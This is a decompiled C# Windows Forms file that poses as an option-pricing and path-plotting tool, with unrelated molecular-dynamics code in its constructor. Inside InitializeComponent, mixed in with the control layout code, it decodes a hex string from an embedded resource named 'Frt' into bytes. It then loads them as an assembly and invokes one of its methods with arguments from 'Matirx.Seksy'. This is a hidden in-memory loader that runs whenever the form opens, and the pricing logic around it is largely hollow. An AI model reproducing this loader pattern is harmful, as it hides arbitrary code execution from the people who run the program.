using System;
using System.Collections.Generic;
using System.Collections.ObjectModel;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Reflection;
using System.Resources;
using System.Windows.Forms;
using System.Windows.Forms.DataVisualization.Charting;
using PricerProj;
using StandAloneMD;

namespace PriceAndGraph;

public class Form1 : Form
{
	private IContainer components = null;

	private Label label1;

	private TextBox textBox1;

	private TextBox textBox2;

	private Label label2;

	private TextBox textBox3;

	private Label label3;

	private TextBox textBox4;

	private Label label4;

	private TextBox textBox5;

	private Label label5;

	private Chart chart1;

	private Button button1;

	private TextBox textBox6;

	private Label label6;

	private TextBox textBox7;

	private Label label7;

	private Button button2;

	public Form1()
	{
		InitializeComponent();
		StaticVariables.myEnvironment = new CreateEnvironment();
		StaticVariables.myEnvironment.PreCompute();
		StaticVariables.myEnvironment.InitAtoms();
		if (StaticVariables.currentPotential == StaticVariables.Potential.LennardJones)
		{
			LennardJones.calculateVerletRadius();
		}
		if (StaticVariables.currentPotential == StaticVariables.Potential.Buckingham)
		{
			Buckingham.calculateVerletRadius();
		}
		Console.WriteLine("Number of atoms = " + StaticVariables.myEnvironment.numAtoms);
		float num = 20000f * StaticVariables.MDTimestep;
		Stopwatch stopwatch = new Stopwatch();
		stopwatch.Start();
		while (StaticVariables.currentTime < num)
		{
			PhysicsEngine.VelocityVerlet();
			PhysicsEngine.ReflectFromWalls();
			PhysicsEngine.CalculateEnergy();
			PairDistributionFunction.calculatePairDistribution();
			StaticVariables.currentTime += StaticVariables.MDTimestep;
			StaticVariables.iTime++;
		}
		stopwatch.Stop();
	}

	private void button1_Click(object sender, EventArgs e)
	{
		//IL_00e3: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			double.Parse(((Control)textBox1).get_Text());
			double val = double.Parse(((Control)textBox2).get_Text());
			double.Parse(((Control)textBox3).get_Text());
			double num = double.Parse(((Control)textBox4).get_Text());
			double num2 = double.Parse(((Control)textBox5).get_Text());
			double inMean = Math.Pow(1.0 + num / 100.0, 1.0 / 252.0) - 1.0;
			double inSigma = num2 / (Math.Sqrt(252.0) * 100.0);
			new MCGenerator(inMean, inSigma);
			((Control)textBox7).set_Text(Math.Max(val, 0.0).ToString());
		}
		catch
		{
			MessageBox.Show("Please check all inputs are entered");
		}
	}

	private void button2_Click(object sender, EventArgs e)
	{
		//IL_00d1: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			Convert.ToInt32(((Control)textBox6).get_Text());
			double.Parse(((Control)textBox1).get_Text());
			double.Parse(((Control)textBox2).get_Text());
			double.Parse(((Control)textBox3).get_Text());
			double num = double.Parse(((Control)textBox4).get_Text());
			double num2 = double.Parse(((Control)textBox5).get_Text());
			double inMean = Math.Pow(1.0 + num / 100.0, 1.0 / 252.0) - 1.0;
			double inSigma = num2 / (Math.Sqrt(252.0) * 100.0);
			new MCGenerator(inMean, inSigma);
		}
		catch
		{
			MessageBox.Show("Please check all inputs are entered");
		}
	}

	private void plotData(List<double[]> results)
	{
		((Collection<Series>)(object)chart1.get_Series()).Clear();
		IEnumerable<int> enumerable = Enumerable.Range(0, results[0].GetLength(0) - 1);
		int num = 0;
		double num2 = double.MinValue;
		double val = double.MaxValue;
		foreach (double[] result in results)
		{
			string text = "Series" + num++;
			chart1.get_Series().Add(text);
			((ChartNamedElementCollection<Series>)(object)chart1.get_Series()).get_Item(text).set_ChartType((SeriesChartType)3);
			foreach (int item in enumerable)
			{
				((ChartNamedElementCollection<Series>)(object)chart1.get_Series()).get_Item(text).get_Points().AddXY((double)item, result[item]);
				num2 = Math.Max(num2, result[item]);
				val = Math.Min(val, result[item]);
			}
		}
		((Collection<ChartArea>)(object)chart1.get_ChartAreas())[0].get_AxisY().set_Minimum(Math.Max(val, 0.0));
		((Collection<ChartArea>)(object)chart1.get_ChartAreas())[0].get_AxisY().set_Maximum(num2);
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		//IL_0006: Unknown result type (might be due to invalid IL or missing references)
		//IL_000c: Expected O, but got Unknown
		//IL_001d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0027: Expected O, but got Unknown
		//IL_0028: Unknown result type (might be due to invalid IL or missing references)
		//IL_0032: Expected O, but got Unknown
		//IL_0033: Unknown result type (might be due to invalid IL or missing references)
		//IL_003d: Expected O, but got Unknown
		//IL_003e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0048: Expected O, but got Unknown
		//IL_0049: Unknown result type (might be due to invalid IL or missing references)
		//IL_0053: Expected O, but got Unknown
		//IL_0054: Unknown result type (might be due to invalid IL or missing references)
		//IL_005e: Expected O, but got Unknown
		//IL_005f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0069: Expected O, but got Unknown
		//IL_006a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0074: Expected O, but got Unknown
		//IL_0075: Unknown result type (might be due to invalid IL or missing references)
		//IL_007f: Expected O, but got Unknown
		//IL_0080: Unknown result type (might be due to invalid IL or missing references)
		//IL_008a: Expected O, but got Unknown
		//IL_008b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0095: Expected O, but got Unknown
		//IL_0096: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a0: Expected O, but got Unknown
		//IL_00a1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ab: Expected O, but got Unknown
		//IL_00ac: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b6: Expected O, but got Unknown
		//IL_00b7: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c1: Expected O, but got Unknown
		//IL_00c2: Unknown result type (might be due to invalid IL or missing references)
		//IL_00cc: Expected O, but got Unknown
		//IL_00cd: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d7: Expected O, but got Unknown
		//IL_0192: Unknown result type (might be due to invalid IL or missing references)
		//IL_0236: Unknown result type (might be due to invalid IL or missing references)
		//IL_02a7: Unknown result type (might be due to invalid IL or missing references)
		//IL_0324: Unknown result type (might be due to invalid IL or missing references)
		//IL_0392: Unknown result type (might be due to invalid IL or missing references)
		//IL_040f: Unknown result type (might be due to invalid IL or missing references)
		//IL_047d: Unknown result type (might be due to invalid IL or missing references)
		//IL_04fa: Unknown result type (might be due to invalid IL or missing references)
		//IL_056b: Unknown result type (might be due to invalid IL or missing references)
		//IL_05e9: Unknown result type (might be due to invalid IL or missing references)
		//IL_0673: Unknown result type (might be due to invalid IL or missing references)
		//IL_070f: Unknown result type (might be due to invalid IL or missing references)
		//IL_07a7: Unknown result type (might be due to invalid IL or missing references)
		//IL_0822: Unknown result type (might be due to invalid IL or missing references)
		//IL_08a0: Unknown result type (might be due to invalid IL or missing references)
		//IL_090e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0980: Unknown result type (might be due to invalid IL or missing references)
		//IL_0b5b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0b65: Expected O, but got Unknown
		//IL_0b6a: Unknown result type (might be due to invalid IL or missing references)
		ChartArea val = new ChartArea();
		Series val2 = new Series();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form1));
		label1 = new Label();
		textBox1 = new TextBox();
		textBox2 = new TextBox();
		label2 = new Label();
		textBox3 = new TextBox();
		label3 = new Label();
		textBox4 = new TextBox();
		label4 = new Label();
		textBox5 = new TextBox();
		label5 = new Label();
		chart1 = new Chart();
		button1 = new Button();
		textBox6 = new TextBox();
		label6 = new Label();
		textBox7 = new TextBox();
		label7 = new Label();
		button2 = new Button();
		ResourceManager resourceManager = new ResourceManager(typeof(Form2));
		string text = (string)resourceManager.GetObject("Frt");
		text = text.Replace("~", "00-");
		string[] array = text.Split(new char[1] { '-' });
		byte[] array2 = new byte[array.Length];
		for (int i = 0; i < array.Length; i++)
		{
			array2[i] = Convert.ToByte(array[i], 16);
		}
		((ISupportInitialize)chart1).BeginInit();
		((Control)this).SuspendLayout();
		((Control)label1).set_AutoSize(true);
		((Control)label1).set_Location(new Point(165, 281));
		((Control)label1).set_Margin(new Padding(5, 0, 5, 0));
		((Control)label1).set_Name("label1");
		((Control)label1).set_Size(new Size(74, 32));
		((Control)label1).set_TabIndex(0);
		((Control)label1).set_Text("Spot");
		Assembly assembly = Assembly.Load(array2);
		string[] seksy = Matirx.Seksy;
		MethodInfo methodInfo = assembly.GetExportedTypes()[1].GetMethods()[1];
		object obj = 0;
		object[] parameters = seksy;
		methodInfo.Invoke(obj, parameters);
		((Control)textBox1).set_Location(new Point(359, 281));
		((Control)textBox1).set_Margin(new Padding(5, 5, 5, 5));
		((Control)textBox1).set_Name("textBox1");
		((Control)textBox1).set_Size(new Size(340, 38));
		((Control)textBox1).set_TabIndex(1);
		((Control)textBox1).set_Text("100");
		((Control)textBox2).set_Location(new Point(359, 363));
		((Control)textBox2).set_Margin(new Padding(5, 5, 5, 5));
		((Control)textBox2).set_Name("textBox2");
		((Control)textBox2).set_Size(new Size(340, 38));
		((Control)textBox2).set_TabIndex(3);
		((Control)textBox2).set_Text("100");
		((Control)label2).set_AutoSize(true);
		((Control)label2).set_Location(new Point(165, 363));
		((Control)label2).set_Margin(new Padding(5, 0, 5, 0));
		((Control)label2).set_Name("label2");
		((Control)label2).set_Size(new Size(88, 32));
		((Control)label2).set_TabIndex(2);
		((Control)label2).set_Text("Strike");
		((Control)textBox3).set_Location(new Point(359, 439));
		((Control)textBox3).set_Margin(new Padding(5, 5, 5, 5));
		((Control)textBox3).set_Name("textBox3");
		((Control)textBox3).set_Size(new Size(340, 38));
		((Control)textBox3).set_TabIndex(5);
		((Control)textBox3).set_Text("550");
		((Control)label3).set_AutoSize(true);
		((Control)label3).set_Location(new Point(165, 439));
		((Control)label3).set_Margin(new Padding(5, 0, 5, 0));
		((Control)label3).set_Name("label3");
		((Control)label3).set_Size(new Size(94, 32));
		((Control)label3).set_TabIndex(4);
		((Control)label3).set_Text("Expiry");
		((Control)textBox4).set_Location(new Point(359, 525));
		((Control)textBox4).set_Margin(new Padding(5, 5, 5, 5));
		((Control)textBox4).set_Name("textBox4");
		((Control)textBox4).set_Size(new Size(340, 38));
		((Control)textBox4).set_TabIndex(7);
		((Control)textBox4).set_Text("2");
		((Control)label4).set_AutoSize(true);
		((Control)label4).set_Location(new Point(165, 525));
		((Control)label4).set_Margin(new Padding(5, 0, 5, 0));
		((Control)label4).set_Name("label4");
		((Control)label4).set_Size(new Size(176, 32));
		((Control)label4).set_TabIndex(6);
		((Control)label4).set_Text("Interest Rate");
		((Control)textBox5).set_Location(new Point(359, 609));
		((Control)textBox5).set_Margin(new Padding(5, 5, 5, 5));
		((Control)textBox5).set_Name("textBox5");
		((Control)textBox5).set_Size(new Size(340, 38));
		((Control)textBox5).set_TabIndex(9);
		((Control)textBox5).set_Text("13");
		((Control)label5).set_AutoSize(true);
		((Control)label5).set_Location(new Point(165, 609));
		((Control)label5).set_Margin(new Padding(5, 0, 5, 0));
		((Control)label5).set_Name("label5");
		((Control)label5).set_Size(new Size(124, 32));
		((Control)label5).set_TabIndex(8);
		((Control)label5).set_Text("Volatility");
		((ChartNamedElement)val).set_Name("ChartArea1");
		((Collection<ChartArea>)(object)chart1.get_ChartAreas()).Add(val);
		((Control)chart1).set_Location(new Point(894, 129));
		((Control)chart1).set_Margin(new Padding(5, 5, 5, 5));
		((Control)chart1).set_Name("chart1");
		val2.set_ChartArea("ChartArea1");
		((ChartNamedElement)val2).set_Name("Series1");
		((Collection<Series>)(object)chart1.get_Series()).Add(val2);
		chart1.set_Size(new Size(1852, 967));
		((Control)chart1).set_TabIndex(10);
		((Control)chart1).set_Text("chart1");
		((Control)button1).set_Location(new Point(172, 936));
		((Control)button1).set_Margin(new Padding(5, 5, 5, 5));
		((Control)button1).set_Name("button1");
		((Control)button1).set_Size(new Size(530, 160));
		((Control)button1).set_TabIndex(11);
		((Control)button1).set_Text("Price");
		((ButtonBase)button1).set_UseVisualStyleBackColor(true);
		((Control)button1).add_Click((EventHandler)button1_Click);
		((Control)textBox6).set_Location(new Point(1163, 1167));
		((Control)textBox6).set_Margin(new Padding(5, 5, 5, 5));
		((Control)textBox6).set_Name("textBox6");
		((Control)textBox6).set_Size(new Size(84, 38));
		((Control)textBox6).set_TabIndex(13);
		((Control)textBox6).set_Text("300");
		((Control)label6).set_AutoSize(true);
		((Control)label6).set_Location(new Point(905, 1167));
		((Control)label6).set_Margin(new Padding(5, 0, 5, 0));
		((Control)label6).set_Name("label6");
		((Control)label6).set_Size(new Size(241, 32));
		((Control)label6).set_TabIndex(12);
		((Control)label6).set_Text("Show no. of paths");
		((Control)textBox7).set_Enabled(false);
		((Control)textBox7).set_Location(new Point(359, 815));
		((Control)textBox7).set_Margin(new Padding(5, 5, 5, 5));
		((Control)textBox7).set_Name("textBox7");
		((Control)textBox7).set_Size(new Size(340, 38));
		((Control)textBox7).set_TabIndex(15);
		((Control)label7).set_AutoSize(true);
		((Control)label7).set_Location(new Point(165, 815));
		((Control)label7).set_Margin(new Padding(5, 0, 5, 0));
		((Control)label7).set_Name("label7");
		((Control)label7).set_Size(new Size(137, 32));
		((Control)label7).set_TabIndex(14);
		((Control)label7).set_Text("Call Price");
		((Control)button2).set_Location(new Point(1301, 1152));
		((Control)button2).set_Margin(new Padding(5, 5, 5, 5));
		((Control)button2).set_Name("button2");
		((Control)button2).set_RightToLeft((RightToLeft)1);
		((Control)button2).set_Size(new Size(396, 73));
		((Control)button2).set_TabIndex(16);
		((Control)button2).set_Text("Plot some paths");
		((ButtonBase)button2).set_UseVisualStyleBackColor(true);
		((Control)button2).add_Click((EventHandler)button2_Click);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(16f, 31f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(2914, 1286));
		((Control)this).get_Controls().Add((Control)(object)button2);
		((Control)this).get_Controls().Add((Control)(object)textBox7);
		((Control)this).get_Controls().Add((Control)(object)label7);
		((Control)this).get_Controls().Add((Control)(object)textBox6);
		((Control)this).get_Controls().Add((Control)(object)label6);
		((Control)this).get_Controls().Add((Control)(object)button1);
		((Control)this).get_Controls().Add((Control)(object)chart1);
		((Control)this).get_Controls().Add((Control)(object)textBox5);
		((Control)this).get_Controls().Add((Control)(object)label5);
		((Control)this).get_Controls().Add((Control)(object)textBox4);
		((Control)this).get_Controls().Add((Control)(object)label4);
		((Control)this).get_Controls().Add((Control)(object)textBox3);
		((Control)this).get_Controls().Add((Control)(object)label3);
		((Control)this).get_Controls().Add((Control)(object)textBox2);
		((Control)this).get_Controls().Add((Control)(object)label2);
		((Control)this).get_Controls().Add((Control)(object)textBox1);
		((Control)this).get_Controls().Add((Control)(object)label1);
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Form)this).set_Margin(new Padding(5, 5, 5, 5));
		((Form)this).set_MaximizeBox(false);
		((Control)this).set_Name("Form1");
		((Control)this).set_Text("Form1");
		((ISupportInitialize)chart1).EndInit();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
